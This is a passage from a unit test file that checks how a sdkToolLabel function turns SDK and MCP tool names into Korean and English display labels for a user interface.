    expect(sdkToolLabel("PresentFile")).toBe("파일 보여주기");
    expect(sdkToolLabel("RequestAdmin")).toBe("관리자 요청");
    expect(sdkToolLabel("mcp__skills__read")).toBe("스킬 읽기");
    expect(sdkToolLabel("mcp__git_repo__commit")).toBe("작업 저장소 커밋");
    expect(sdkToolLabel("mcp__hex-ssh__remote-ssh")).toBe("원격 명령 실행");
    expect(sdkToolLabel("mcp__plugins__jira_cli__search_issues")).toBe("search issues (jira_cli)");
    expect(sdkToolLabel("mcp__shared__docs__lookup")).toBe("lookup (docs)");
  });
});
